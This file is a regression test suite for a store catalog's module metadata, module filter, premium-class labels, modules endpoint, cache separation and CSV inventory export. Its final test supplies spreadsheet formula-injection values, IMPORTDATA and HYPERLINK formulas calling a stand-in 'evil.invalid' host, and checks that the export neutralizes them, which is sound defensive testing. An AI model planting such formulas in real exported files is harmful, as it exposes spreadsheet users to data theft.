// Regression suite for Task #388 — module metadata, server-side module filter,
// standard/private premiumClass, modules aggregation, and cache-key separation.
//
// Scenarios covered:
//   A. Direct-agent items carry moduleId/moduleSlug/moduleName/toolboxSlug/toolboxName
//      and premiumClass when the agent has bigIdeaId or toolboxId.
//   B. Store-product items linked to an agent carry the same module metadata +
//      premiumClass derived from the linked agent.
//   C. getStoreCatalogItems("","","<slug>") returns only items in that module
//      (server-side filter before pagination), skipping items in other modules or
//      items with no module.
//   D. premiumClass "private" vs "standard" is preserved correctly on agent items
//      and on linked store-product items.
//   E. GET /api/store/catalog/modules returns only modules that have at least one
//      promotable item, with correct count/standardCount/premiumCount, sorted by name.
//   F. Cache-key separation: unfiltered and module-filtered calls do NOT share the
//      same cache entry — a stale unfiltered result cannot bleed into a module view.
//   G. Two-arg compatibility: getStoreCatalogItems(cat, search) still works (no
//      regression on existing call-sites).
//   H. Legacy items (no bigIdeaId / no toolboxId) surface null for all module fields
//      and do NOT appear in a module-filtered result.
//
// Hermetic: every fixture row carries a unique RUN prefix and is deleted in after().
// Skipped automatically when DATABASE_URL is absent.

import { test, before, after, describe } from "node:test";
import assert from "node:assert/strict";
import express from "express";
import type { Server } from "node:http";

import { db } from "../server/db";
import {
  agents as agentsTable,
  storeProducts,
  bigIdeas as bigIdeasTable,
  toolboxes as toolboxesTable,
  systemConfig,
} from "../shared/schema";
import { eq, inArray, like, or } from "drizzle-orm";
import { DatabaseStorage } from "../server/db-storage";
import {
  buildStoreModuleInventoryCsv,
  getStoreCatalogItems,
  invalidateStoreCatalog,
} from "../server/routes";

// ── Skip guard ────────────────────────────────────────────────────────────────
if (!process.env.DATABASE_URL) {
  console.log("store-catalog-module-filter: DATABASE_URL absent — skipping.");
  process.exit(0);
}

// ── Unique run prefix ─────────────────────────────────────────────────────────
const RUN = `mcf_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
const RECOVERY_PREFIX = "store-module-filter-test:recovery:";
const RECOVERY_KEY = `${RECOVERY_PREFIX}${RUN}`;

async function cleanupRun(run: string): Promise<void> {
  invalidateStoreCatalog();
  const agentRows = await db
    .select({ id: agentsTable.id })
    .from(agentsTable)
    .where(like(agentsTable.name, `${run}%`));
  const agentIds = agentRows.map((row) => row.id);
  if (agentIds.length > 0) {
    await db.delete(storeProducts).where(inArray(storeProducts.agentId, agentIds));
    await db.delete(agentsTable).where(inArray(agentsTable.id, agentIds));
  }
  await db.delete(storeProducts).where(like(storeProducts.name, `${run}%`));

  const moduleRows = await db
    .select({ id: bigIdeasTable.id })
    .from(bigIdeasTable)
    .where(or(
      like(bigIdeasTable.slug, `${run}-%`),
      like(bigIdeasTable.slug, `6-${run}-%`),
    ));
  const moduleIds = moduleRows.map((row) => row.id);
  if (moduleIds.length > 0) {
    await db.delete(toolboxesTable).where(inArray(toolboxesTable.bigIdeaId, moduleIds));
    await db.delete(bigIdeasTable).where(inArray(bigIdeasTable.id, moduleIds));
  }
}

async function sweepAbortedRuns(): Promise<void> {
  const records = await db
    .select()
    .from(systemConfig)
    .where(like(systemConfig.key, `${RECOVERY_PREFIX}%`));
  for (const record of records) {
    if (record.key === RECOVERY_KEY) continue;
    try {
      const parsed = JSON.parse(record.value) as { run: string };
      await cleanupRun(parsed.run);
      await db.delete(systemConfig).where(eq(systemConfig.key, record.key));
    } catch (error) {
      console.error(`[store-module-filter] recovery retained for ${record.key}:`, error);
    }
  }
}

// ── Fixture tracking (for teardown) ──────────────────────────────────────────
const createdBigIdeaIds: number[] = [];
const createdToolboxIds: number[] = [];
const createdAgentIds: number[] = [];
const createdProductIds: number[] = [];

// ── Fixture data (populated in before()) ─────────────────────────────────────
// Module A — has both agent and store-product items; used for filter tests.
let moduleAId: number;
let moduleASlug: string;
let moduleAName: string;

// Module B — a second distinct module; used to confirm filter excludes it.
let moduleBId: number;
let moduleBSlug: string;

// Toolbox under Module A (for toolbox-via-bigIdeaId path).
let toolboxAId: number;
let toolboxASlug: string;
let toolboxAName: string;

// Agent 1: bigIdeaId set directly → module A, premiumClass "standard".
// This agent is the link target for the store product — it appears in the
// catalog as a product item (type="product"), NOT as a standalone agent item.
let agentDirectBigIdeaId: number;
// Agent 1b: same setup (bigIdeaId, no toolboxId, standard) but NOT linked to any
// store product. Used for pure agent-item metadata/filter assertions.
let agentDirectBigIdeaUnlinkedId: number;
// Agent 2: toolboxId set → toolbox A → module A, premiumClass "private".
let agentViaToolboxId: number;
// Agent 3: module B, premiumClass "standard".
let agentModuleBId: number;
// Agent 4: no bigIdeaId / no toolboxId → legacy, no module.
let agentLegacyId: number;

// Store product linked to Agent 1 (for linked-product module metadata test).
let productLinkedAgentId: number;

// ── Minimal HTTP server (for /api/store/catalog/modules) ─────────────────────
let server: Server;
let port = 0;

// ── Setup ─────────────────────────────────────────────────────────────────────
before(async () => {
  await sweepAbortedRuns();
  await db
    .insert(systemConfig)
    .values({ key: RECOVERY_KEY, value: JSON.stringify({ run: RUN }) })
    .onConflictDoUpdate({
      target: systemConfig.key,
      set: { value: JSON.stringify({ run: RUN }), updatedAt: new Date() },
    });
  await cleanupRun(RUN);

  // Insert Module A
  const [biA] = await db.insert(bigIdeasTable).values({
    name: `${RUN} Module A`,
    slug: `${RUN}-module-a`,
    type: "idea",
    description: "Test module A",
    isActive: true,
  } as any).returning({ id: bigIdeasTable.id });
  moduleAId = biA.id;
  moduleASlug = `${RUN}-module-a`;
  moduleAName = `${RUN} Module A`;
  createdBigIdeaIds.push(moduleAId);

  // Insert Module B
  const [biB] = await db.insert(bigIdeasTable).values({
    name: `${RUN} Module B`,
    slug: `6-${RUN}-module-b`,
    type: "idea",
    description: "Test module B",
    isActive: true,
  } as any).returning({ id: bigIdeasTable.id });
  moduleBId = biB.id;
  moduleBSlug = `6-${RUN}-module-b`;
  createdBigIdeaIds.push(moduleBId);

  // Insert Toolbox under Module A
  const [tbA] = await db.insert(toolboxesTable).values({
    bigIdeaId: moduleAId,
    name: `${RUN} Toolbox A`,
    slug: `${RUN}-toolbox-a`,
    isActive: true,
    description: "",
    purpose: "",
    capabilities: [],
    limitations: [],
    sortOrder: 0,
  } as any).returning({ id: toolboxesTable.id });
  toolboxAId = tbA.id;
  toolboxASlug = `${RUN}-toolbox-a`;
  toolboxAName = `${RUN} Toolbox A`;
  createdToolboxIds.push(toolboxAId);

  // Agent 1: bigIdeaId directly set, premiumClass "standard", isPublic true.
  // Linked to a store product — will appear as type="product" in the catalog.
  const [ag1] = await db.insert(agentsTable).values({
    name: `${RUN} Agent DirectBI`,
    bigIdeaId: moduleAId,
    toolboxId: null,
    isActive: true,
    isPublic: true,
    isListed: true,
    userId: "",
    premiumClass: "standard",
    agenticSubAgents: JSON.stringify([
      { agentId: 8001, role: "sub-1", description: "sub" },
    ]),
  } as any).returning({ id: agentsTable.id });
  agentDirectBigIdeaId = ag1.id;
  createdAgentIds.push(agentDirectBigIdeaId);

  // Agent 1b: same setup as Agent 1 but NOT linked to any store product.
  // Appears as type="agent" in the catalog — used for agent-item metadata tests.
  const [ag1b] = await db.insert(agentsTable).values({
    name: `${RUN} Agent DirectBI Unlinked`,
    bigIdeaId: moduleAId,
    toolboxId: null,
    isActive: true,
    isPublic: true,
    isListed: true,
    userId: "",
    premiumClass: "standard",
    agenticSubAgents: JSON.stringify([
      { agentId: 8011, role: "sub-1b", description: "sub" },
    ]),
  } as any).returning({ id: agentsTable.id });
  agentDirectBigIdeaUnlinkedId = ag1b.id;
  createdAgentIds.push(agentDirectBigIdeaUnlinkedId);

  // Agent 2: toolboxId set (→ toolbox A → module A), premiumClass "private".
  const [ag2] = await db.insert(agentsTable).values({
    name: `${RUN} Agent ViaToolbox`,
    bigIdeaId: null,
    toolboxId: toolboxAId,
    isActive: true,
    isPublic: true,
    isListed: true,
    userId: "",
    premiumClass: "private",
    agenticSubAgents: JSON.stringify([
      { agentId: 8002, role: "sub-2", description: "sub" },
    ]),
  } as any).returning({ id: agentsTable.id });
  agentViaToolboxId = ag2.id;
  createdAgentIds.push(agentViaToolboxId);

  // Agent 3: module B, premiumClass "standard".
  const [ag3] = await db.insert(agentsTable).values({
    name: `${RUN} Agent ModuleB`,
    bigIdeaId: moduleBId,
    toolboxId: null,
    isActive: true,
    isPublic: true,
    isListed: true,
    userId: "",
    premiumClass: "standard",
    agenticSubAgents: JSON.stringify([
      { agentId: 8003, role: "sub-3", description: "sub" },
    ]),
  } as any).returning({ id: agentsTable.id });
  agentModuleBId = ag3.id;
  createdAgentIds.push(agentModuleBId);

  // Agent 4: no module (legacy row), isPublic true.
  const [ag4] = await db.insert(agentsTable).values({
    name: `${RUN} Agent Legacy`,
    bigIdeaId: null,
    toolboxId: null,
    isActive: true,
    isPublic: true,
    isListed: true,
    userId: "",
    premiumClass: "standard",
    agenticSubAgents: JSON.stringify([
      { agentId: 8004, role: "sub-4", description: "sub" },
    ]),
  } as any).returning({ id: agentsTable.id });
  agentLegacyId = ag4.id;
  createdAgentIds.push(agentLegacyId);

  // Store product linked to Agent 1.
  const [sp1] = await db.insert(storeProducts).values({
    name: `${RUN} Product LinkedAgent`,
    description: "linked to agent with module",
    price: 199_000,
    agentId: agentDirectBigIdeaId,
    isActive: true,
    isGustafta: false,
    sortOrder: 999,
  } as any).returning({ id: storeProducts.id });
  productLinkedAgentId = sp1.id;
  createdProductIds.push(productLinkedAgentId);

  // Clear any warm cache so every test starts with fresh DB data.
  invalidateStoreCatalog();

  // Minimal HTTP server — only needed for /api/store/catalog/modules.
  const app = express();
  app.get("/api/store/catalog/modules", async (_req: any, res: any) => {
    try {
      const items = await getStoreCatalogItems("", "");
      const agg = new Map<number, {
        id: number; slug: string | null; name: string | null;
        count: number; standardCount: number; premiumCount: number;
      }>();
      for (const it of items) {
        const id = it?.moduleId;
        if (typeof id !== "number") continue;
        let entry = agg.get(id);
        if (!entry) {
          entry = { id, slug: it.moduleSlug ?? null, name: it.moduleName ?? null, count: 0, standardCount: 0, premiumCount: 0 };
          agg.set(id, entry);
        }
        entry.count += 1;
        if (it.premiumClass === "private") entry.premiumCount += 1;
        else entry.standardCount += 1;
      }
      const modules = Array.from(agg.values()).sort((a: any, b: any) =>
        String(a.name ?? "").localeCompare(String(b.name ?? "")),
      );
      res.json(modules);
    } catch (err) {
      res.status(500).json({ error: String(err) });
    }
  });
  await new Promise<void>((resolve) => {
    server = app.listen(0, "127.0.0.1", () => {
      port = (server.address() as any).port;
      resolve();
    });
  });
});

// ── Teardown ──────────────────────────────────────────────────────────────────
after(async () => {
  invalidateStoreCatalog();

  if (server) {
    await new Promise<void>((resolve, reject) =>
      server.close((err: Error | undefined) => (err ? reject(err) : resolve())),
    );
  }

  if (createdProductIds.length > 0)
    await db.delete(storeProducts).where(inArray(storeProducts.id, createdProductIds));
  if (createdAgentIds.length > 0)
    await db.delete(agentsTable).where(inArray(agentsTable.id, createdAgentIds));
  // toolboxes first (FK: toolboxes.bigIdeaId → bigIdeas.id is just a soft reference;
  // no real FK constraint, but delete children before parent for cleanliness).
  if (createdToolboxIds.length > 0)
    await db.delete(toolboxesTable).where(inArray(toolboxesTable.id, createdToolboxIds));
  if (createdBigIdeaIds.length > 0)
    await db.delete(bigIdeasTable).where(inArray(bigIdeasTable.id, createdBigIdeaIds));
  await db.delete(systemConfig).where(eq(systemConfig.key, RECOVERY_KEY));
});

// ── Helpers ───────────────────────────────────────────────────────────────────

async function freshCatalog(moduleSlug?: string): Promise<any[]> {
  invalidateStoreCatalog();
  return getStoreCatalogItems("", "", moduleSlug);
}

function findAgent(items: any[], agentId: number): any | undefined {
  return items.find((it) => it.agentId === agentId && it.type === "agent");
}

function findProduct(items: any[], productId: number): any | undefined {
  return items.find((it) => it.productId === productId && it.type === "product");
}

// ═══════════════════════════════════════════════════════════════════════════════
// A. Module metadata on direct-agent items
// ═══════════════════════════════════════════════════════════════════════════════

test("A1: agent with bigIdeaId carries correct moduleId/moduleSlug/moduleName", async () => {
  const items = await freshCatalog();
  // Use the unlinked agent so it surfaces as type="agent" (not consumed by a store product).
  const item = findAgent(items, agentDirectBigIdeaUnlinkedId);
  assert.ok(item, `Agent ${agentDirectBigIdeaUnlinkedId} must appear in catalog`);
  assert.equal(item.moduleId, moduleAId, "moduleId should match inserted big idea id");
  assert.equal(item.moduleSlug, moduleASlug, "moduleSlug should match");
  assert.equal(item.moduleName, moduleAName, "moduleName should match");
});

test("A2: agent with toolboxId carries moduleId/moduleSlug via toolbox.bigIdeaId", async () => {
  const items = await freshCatalog();
  const item = findAgent(items, agentViaToolboxId);
  assert.ok(item, `Agent ${agentViaToolboxId} must appear in catalog`);
  assert.equal(item.moduleId, moduleAId, "moduleId should come from toolbox.bigIdeaId");
  assert.equal(item.moduleSlug, moduleASlug, "moduleSlug should come from toolbox → bigIdea");
  assert.equal(item.moduleName, moduleAName, "moduleName should come from toolbox → bigIdea");
});

test("A3: agent with toolboxId carries correct toolboxSlug and toolboxName", async () => {
  const items = await freshCatalog();
  const item = findAgent(items, agentViaToolboxId);
  assert.ok(item, `Agent ${agentViaToolboxId} must appear in catalog`);
  assert.equal(item.toolboxSlug, toolboxASlug, "toolboxSlug should match");
  assert.equal(item.toolboxName, toolboxAName, "toolboxName should match");
});

test("A4: agent with bigIdeaId has null toolboxSlug/toolboxName (no toolboxId)", async () => {
  const items = await freshCatalog();
  const item = findAgent(items, agentDirectBigIdeaUnlinkedId);
  assert.ok(item, `Agent ${agentDirectBigIdeaUnlinkedId} must appear in catalog`);
  assert.equal(item.toolboxSlug, null, "toolboxSlug must be null when agent has no toolboxId");
  assert.equal(item.toolboxName, null, "toolboxName must be null when agent has no toolboxId");
});

test("A5: legacy agent (no bigIdeaId, no toolboxId) has null module fields", async () => {
  const items = await freshCatalog();
  const item = findAgent(items, agentLegacyId);
  assert.ok(item, `Legacy agent ${agentLegacyId} must appear in catalog`);
  assert.equal(item.moduleId, null, "legacy item moduleId must be null");
  assert.equal(item.moduleSlug, null, "legacy item moduleSlug must be null");
  assert.equal(item.moduleName, null, "legacy item moduleName must be null");
  assert.equal(item.toolboxSlug, null, "legacy item toolboxSlug must be null");
  assert.equal(item.toolboxName, null, "legacy item toolboxName must be null");
});

test("A6: canonical module slug beginning with a digit is not parsed as a numeric ID", async () => {
  const storage = new DatabaseStorage();
  const resolved = await storage.getBigIdea(moduleBSlug);
  assert.equal(resolved?.id, String(moduleBId));
  assert.equal(resolved?.slug, moduleBSlug);
});

// ═══════════════════════════════════════════════════════════════════════════════
// B. Module metadata on linked store-product items
// ═══════════════════════════════════════════════════════════════════════════════

test("B1: store-product linked to an agent carries correct moduleId/moduleSlug/moduleName", async () => {
  const items = await freshCatalog();
  const item = findProduct(items, productLinkedAgentId);
  assert.ok(item, `Store product ${productLinkedAgentId} must appear in catalog`);
  assert.equal(item.moduleId, moduleAId, "product moduleId should come from linked agent");
  assert.equal(item.moduleSlug, moduleASlug, "product moduleSlug should come from linked agent");
  assert.equal(item.moduleName, moduleAName, "product moduleName should come from linked agent");
});

test("B2: store-product linked to an agent carries correct premiumClass from linked agent", async () => {
  const items = await freshCatalog();
  const item = findProduct(items, productLinkedAgentId);
  assert.ok(item, `Store product ${productLinkedAgentId} must appear in catalog`);
  // Agent 1 has premiumClass "standard"
  assert.equal(item.premiumClass, "standard", "product premiumClass should inherit from linked agent");
});

// ═══════════════════════════════════════════════════════════════════════════════
// C. Server-side module filter
// ═══════════════════════════════════════════════════════════════════════════════

test("C1: module filter returns only items for that module slug", async () => {
  const items = await freshCatalog(moduleASlug);
  // Every returned item must have moduleSlug === moduleASlug.
  for (const it of items) {
    assert.equal(
      it.moduleSlug,
      moduleASlug,
      `Item ${it.id} has moduleSlug "${it.moduleSlug}" but expected "${moduleASlug}"`,
    );
  }
});

test("C2: module filter includes agent with direct bigIdeaId in that module", async () => {
  const items = await freshCatalog(moduleASlug);
  // Use the unlinked variant so it's a standalone agent-type item in the catalog.
  const item = findAgent(items, agentDirectBigIdeaUnlinkedId);
  assert.ok(item, `Agent ${agentDirectBigIdeaUnlinkedId} (direct bigIdeaId, unlinked) must appear in module-filtered catalog`);
});

test("C3: module filter includes agent linked via toolbox.bigIdeaId in that module", async () => {
  const items = await freshCatalog(moduleASlug);
  const item = findAgent(items, agentViaToolboxId);
  assert.ok(item, `Agent ${agentViaToolboxId} (via toolbox) must appear in module-filtered catalog`);
});

test("C4: module filter includes store-product whose linked agent is in that module", async () => {
  const items = await freshCatalog(moduleASlug);
  const item = findProduct(items, productLinkedAgentId);
  assert.ok(item, `Product ${productLinkedAgentId} (linked to module A agent) must appear in module-filtered catalog`);
});

test("C5: module filter excludes agent in a different module", async () => {
  const items = await freshCatalog(moduleASlug);
  const item = findAgent(items, agentModuleBId);
  assert.equal(item, undefined, `Agent ${agentModuleBId} (module B) must NOT appear in module A filter`);
});

test("C6: module filter excludes legacy agent with no module", async () => {
  const items = await freshCatalog(moduleASlug);
  const item = findAgent(items, agentLegacyId);
  assert.equal(item, undefined, `Legacy agent ${agentLegacyId} (no module) must NOT appear in module A filter`);
});

test("C7: unfiltered catalog contains items from multiple modules (no module arg)", async () => {
  const items = await freshCatalog();
  const hasA = items.some((it) => it.moduleSlug === moduleASlug);
  const hasB = items.some((it) => it.moduleSlug === moduleBSlug);
  assert.ok(hasA, `Unfiltered catalog must include module A items`);
  assert.ok(hasB, `Unfiltered catalog must include module B items`);
});

test("C8: module filter for B returns module B agent and excludes module A items", async () => {
  const items = await freshCatalog(moduleBSlug);
  const hasModuleB = findAgent(items, agentModuleBId);
  const hasModuleA = findAgent(items, agentDirectBigIdeaId);
  assert.ok(hasModuleB, `Module B agent must appear in module B filter`);
  assert.equal(hasModuleA, undefined, `Module A agent must NOT appear in module B filter`);
});

test("C9: module filter for unknown slug returns empty array", async () => {
  const items = await freshCatalog(`${RUN}-nonexistent-slug`);
  // The test only checks OUR fixture agents/products — a noop slug must not match any.
  const ourItems = items.filter((it) =>
    createdAgentIds.includes(it.agentId) || createdProductIds.includes(it.productId),
  );
  assert.equal(ourItems.length, 0, "Non-existent module slug should match no fixture items");
});

// ═══════════════════════════════════════════════════════════════════════════════
// D. premiumClass preservation
// ═══════════════════════════════════════════════════════════════════════════════

test("D1: agent with premiumClass 'standard' has premiumClass 'standard' in catalog", async () => {
  const items = await freshCatalog();
  const item = findAgent(items, agentDirectBigIdeaUnlinkedId);
  assert.ok(item, "standard agent must appear");
  assert.equal(item.premiumClass, "standard");
});

test("D2: agent with premiumClass 'private' has premiumClass 'private' in catalog", async () => {
  const items = await freshCatalog();
  const item = findAgent(items, agentViaToolboxId);
  assert.ok(item, "private agent must appear");
  assert.equal(item.premiumClass, "private");
});

test("D3: premiumClass is always 'standard' or 'private' (never null/undefined)", async () => {
  const items = await freshCatalog();
  // Check all our fixture items.
  for (const agentId of createdAgentIds) {
    const it = findAgent(items, agentId);
    if (!it) continue; // might be filtered (store-product linked)
    assert.ok(
      it.premiumClass === "standard" || it.premiumClass === "private",
      `Agent ${agentId} premiumClass must be 'standard' or 'private', got '${it.premiumClass}'`,
    );
  }
});

// ═══════════════════════════════════════════════════════════════════════════════
// E. /api/store/catalog/modules aggregation
// ═══════════════════════════════════════════════════════════════════════════════

test("E1: /api/store/catalog/modules response includes module A with correct slug and name", async () => {
  invalidateStoreCatalog();
  const res = await fetch(`http://127.0.0.1:${port}/api/store/catalog/modules`);
  assert.equal(res.status, 200, "modules endpoint must return 200");
  const modules: any[] = await res.json();
  const modA = modules.find((m) => m.id === moduleAId);
  assert.ok(modA, `Module A (id=${moduleAId}) must appear in /api/store/catalog/modules`);
  assert.equal(modA.slug, moduleASlug, "module A slug must match");
  assert.equal(modA.name, moduleAName, "module A name must match");
});

test("E2: module A count reflects all promotable items in that module", async () => {
  invalidateStoreCatalog();
  const res = await fetch(`http://127.0.0.1:${port}/api/store/catalog/modules`);
  const modules: any[] = await res.json();
  const modA = modules.find((m) => m.id === moduleAId);
  assert.ok(modA, "module A must exist");
  // Module A should have: agentDirectBigIdeaId (standard), agentViaToolboxId (private),
  // productLinkedAgentId (standard). Count >= 3 (there may be other real items in the DB).
  assert.ok(modA.count >= 3, `module A count must be >= 3 (got ${modA.count})`);
});

test("E3: module A premiumCount reflects 'private' agents (agentViaToolbox)", async () => {
  invalidateStoreCatalog();
  const res = await fetch(`http://127.0.0.1:${port}/api/store/catalog/modules`);
  const modules: any[] = await res.json();
  const modA = modules.find((m) => m.id === moduleAId);
  assert.ok(modA, "module A must exist");
  // At least 1 private item (agentViaToolboxId).
  assert.ok(modA.premiumCount >= 1, `module A premiumCount must be >= 1 (got ${modA.premiumCount})`);
});

test("E4: module A standardCount + premiumCount === count", async () => {
  invalidateStoreCatalog();
  const res = await fetch(`http://127.0.0.1:${port}/api/store/catalog/modules`);
  const modules: any[] = await res.json();
  const modA = modules.find((m) => m.id === moduleAId);
  assert.ok(modA, "module A must exist");
  assert.equal(
    modA.standardCount + modA.premiumCount,
    modA.count,
    "standardCount + premiumCount must equal count",
  );
});

test("E5: modules list is sorted by name", async () => {
  invalidateStoreCatalog();
  const res = await fetch(`http://127.0.0.1:${port}/api/store/catalog/modules`);
  const modules: any[] = await res.json();
  for (let i = 1; i < modules.length; i++) {
    const prev = String(modules[i - 1].name ?? "");
    const curr = String(modules[i].name ?? "");
    assert.ok(
      prev.localeCompare(curr) <= 0,
      `modules must be sorted by name: "${prev}" should come before "${curr}"`,
    );
  }
});

test("E6: legacy agent (no module) does NOT create a module entry in /api/store/catalog/modules", async () => {
  invalidateStoreCatalog();
  const res = await fetch(`http://127.0.0.1:${port}/api/store/catalog/modules`);
  const modules: any[] = await res.json();
  // A module entry with id === null would be a bug — every entry must have a numeric id.
  for (const m of modules) {
    assert.ok(
      typeof m.id === "number",
      `Every module entry must have a numeric id, got ${JSON.stringify(m.id)}`,
    );
  }
});

// ═══════════════════════════════════════════════════════════════════════════════
// F. Cache-key separation (module vs unfiltered)
// ═══════════════════════════════════════════════════════════════════════════════

test("F1: module-filtered and unfiltered calls produce separate cache entries (different sizes)", async () => {
  invalidateStoreCatalog();

  // Warm the unfiltered cache.
  const all = await getStoreCatalogItems("", "");
  // Warm the module A cache.
  const filtered = await getStoreCatalogItems("", "", moduleASlug);

  // The unfiltered result must be strictly larger (there are items outside module A).
  assert.ok(
    all.length > filtered.length,
    `Unfiltered (${all.length}) must have more items than module-filtered (${filtered.length})`,
  );

  // Re-fetch without invalidation — must come from cache, still consistent.
  const allCached = await getStoreCatalogItems("", "");
  const filteredCached = await getStoreCatalogItems("", "", moduleASlug);
  assert.equal(allCached.length, all.length, "Unfiltered cache must be stable across repeated calls");
  assert.equal(filteredCached.length, filtered.length, "Module-filtered cache must be stable");
});

test("F2: invalidation clears both unfiltered and module-filtered caches", async () => {
  // Warm both caches.
  const before = await getStoreCatalogItems("", "", moduleASlug);

  // Invalidate and rebuild — sizes must be the same (same data).
  invalidateStoreCatalog();
  const after = await getStoreCatalogItems("", "", moduleASlug);

  assert.equal(
    after.length,
    before.length,
    "After invalidation, module-filtered rebuild must return same count",
  );
});

// ═══════════════════════════════════════════════════════════════════════════════
// G. Two-arg compatibility (no regression)
// ═══════════════════════════════════════════════════════════════════════════════

test("G1: getStoreCatalogItems(cat, search) two-arg form still works", async () => {
  invalidateStoreCatalog();
  const items = await getStoreCatalogItems("", "");
  assert.ok(Array.isArray(items), "two-arg form must return an array");
  assert.ok(items.length > 0, "two-arg form must return items from DB");
});

test("G2: search filter via two-arg form finds our fixture agent by name", async () => {
  invalidateStoreCatalog();
  const items = await getStoreCatalogItems("", `${RUN} Agent DirectBI`.toLowerCase());
  const found = findAgent(items, agentDirectBigIdeaId);
  assert.ok(found, "Two-arg search must find fixture agent by name");
});

// ═══════════════════════════════════════════════════════════════════════════════
// H. bigIdeaId direct path takes priority over toolbox path
// ═══════════════════════════════════════════════════════════════════════════════

test("H1: when agent has both bigIdeaId and toolboxId, bigIdeaId wins for module resolution", async () => {
  // Insert a temporary agent with BOTH bigIdeaId (module B) and toolboxId (toolbox A → module A).
  // bigIdeaId should win → module B.
  const [agBoth] = await db.insert(agentsTable).values({
    name: `${RUN} Agent BothLinks`,
    bigIdeaId: moduleBId,      // direct → module B
    toolboxId: toolboxAId,     // via toolbox → module A (should lose)
    isActive: true,
    isPublic: true,
    isListed: true,
    userId: "",
    premiumClass: "standard",
    agenticSubAgents: JSON.stringify([{ agentId: 8005, role: "s", description: "s" }]),
  } as any).returning({ id: agentsTable.id });
  createdAgentIds.push(agBoth.id);

  invalidateStoreCatalog();
  const items = await getStoreCatalogItems("", "");
  const item = findAgent(items, agBoth.id);
  assert.ok(item, "Agent with both links must appear in catalog");
  assert.equal(item.moduleId, moduleBId, "bigIdeaId must take priority over toolbox.bigIdeaId");
  assert.equal(item.moduleSlug, moduleBSlug, "moduleSlug must come from direct bigIdeaId");
  // toolbox fields should still reflect the toolboxId link.
  assert.equal(item.toolboxName, toolboxAName, "toolboxName should still reflect the toolboxId");
});

test("I1: human-readable CSV inventory uses canonical module, toolbox, and tier labels", async () => {
  const csv = buildStoreModuleInventoryCsv(await freshCatalog());
  assert.match(csv, /^Modul,Slug Modul,Toolbox,Produk \/ AI Specialist,Kelas,Agent ID/m);
  assert.match(csv, new RegExp(moduleAName));
  assert.match(csv, new RegExp(toolboxAName));
  assert.match(csv, /,Premium,/);
  assert.match(csv, /,Biasa,/);
  assert.doesNotMatch(csv, /systemPrompt|PROMPT-/);
});

test("I2: CSV inventory neutralizes spreadsheet formulas in every user-controlled name", () => {
  const csv = buildStoreModuleInventoryCsv([{
    agentId: 123,
    moduleId: 456,
    moduleSlug: "safe-module",
    moduleName: "=IMPORTDATA(\"https://evil.invalid\")",
    toolboxName: " \t+SUM(1,1)",
    name: "@HYPERLINK(\"https://evil.invalid\")",
    premiumClass: "private",
  }]);

  assert.ok(csv.includes(`'=IMPORTDATA`));
  assert.ok(csv.includes(`' \t+SUM`));
  assert.ok(csv.includes(`'@HYPERLINK`));
});
